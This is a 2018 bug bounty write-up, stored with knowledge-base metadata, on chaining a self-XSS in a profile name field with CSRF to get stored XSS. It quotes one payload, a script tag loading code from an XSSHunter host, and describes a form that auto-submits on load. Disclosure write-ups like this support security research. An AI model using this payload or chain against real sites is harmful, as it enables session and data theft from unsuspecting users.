---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-05-20_self-xss-csrf-to-stored-xss.md
original_filename: 2018-05-20_self-xss-csrf-to-stored-xss.md
title: Self-XSS + CSRF to Stored XSS
category: documents
detected_topics:
- xss
- command-injection
- csrf
- api-security
tags:
- imported
- documents
- xss
- command-injection
- csrf
- api-security
language: en
raw_sha256: 767b931c7f396f2cbc0a9887a50864570e9592d11b4563ce51baf8cb8d1ceba0
text_sha256: cd93f66dfe13af4eff7a510cc8ddd863815ff30f3dee52d510da97030f35d55b
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Self-XSS + CSRF to Stored XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-05-20_self-xss-csrf-to-stored-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, csrf, api-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `767b931c7f396f2cbc0a9887a50864570e9592d11b4563ce51baf8cb8d1ceba0`
- Text SHA256: `cd93f66dfe13af4eff7a510cc8ddd863815ff30f3dee52d510da97030f35d55b`


## Content

---
title: "Self-XSS + CSRF to Stored XSS"
url: "https://medium.com/@renwa/self-xss-csrf-to-stored-xss-54f9f423a7f1"
authors: ["Renwa (@RenwaX23)"]
bugs: ["Self-XSS", "CSRF", "Stored XSS"]
publication_date: "2018-05-20"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5874
scraped_via: "browseros"
---

# Self-XSS + CSRF to Stored XSS

Self-XSS + CSRF to Stored XSS
Renwa
Follow
3 min read
·
May 20, 2018

470

Hola, this is Renwa from Kurdistan i’m glad to write my first write-up about infosec and Bugbounties.

so i was digging in the website and finally i found an xss when a user wants to change his name added a simple payload and refreshed the page, bingo!

Press enter or click to view image in full size
user settings panel
Press enter or click to view image in full size
XSS proof

so the problem is the profile is not public and the only way to get the XSS is to tell the victim to change his name to malicious javascript code and that will be called Self-XSS there is no impact with it.

i started burpsuite and changed my name the request looks like:

Press enter or click to view image in full size

hmm that looks interesting, i generated burpsuite CSRF poc

Press enter or click to view image in full size

replayed in browser response was:

Press enter or click to view image in full size

Awesome! now we have CSRF + Self-XSS let’s chain that together the form now looks like:

Press enter or click to view image in full size
Final POC

as you can see in the last name field i have added the javascript code it’s from xsshunter.com that generate XSS poc you should give a try.

Get Renwa’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

“><script src=https://***.xss.ht></script>

and in the last i have added javascript submit form on load the file to make it more effective.

now the user name is changed to the javascript code after he navigate the homepage the code will be in his browser and send back all info’s we need since there wasn’t any CSP protection.

Press enter or click to view image in full size
Stored XSS

and going back to XSSHunter we can confirm it became Stored XSS, when any user opens our HTML form.

Press enter or click to view image in full size

After all thanks for reading if i helped clap hands to more write-ups about infosec, remember where there is self-XSS always look for CSRF to chain it together and make it a stored, by self-XSS i don’t mean user entered codes into browser console or self-dom XSS .

//Renwa
